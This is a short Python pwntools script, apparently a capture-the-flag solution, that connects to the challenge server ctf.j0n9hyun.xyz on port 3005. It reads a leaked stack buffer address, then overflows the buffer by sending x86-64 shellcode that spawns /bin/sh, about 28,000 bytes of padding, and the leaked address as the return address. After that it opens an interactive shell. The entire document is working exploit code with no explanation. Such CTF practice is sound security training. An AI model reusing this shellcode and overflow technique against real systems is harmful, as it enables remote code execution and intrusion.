from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3005)

r.recvuntil("buf: ")
addr = int(r.recv(14), 16)

payload = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload += b"A"*27937
payload += p64(addr)

r.sendline(payload)
r.interactive()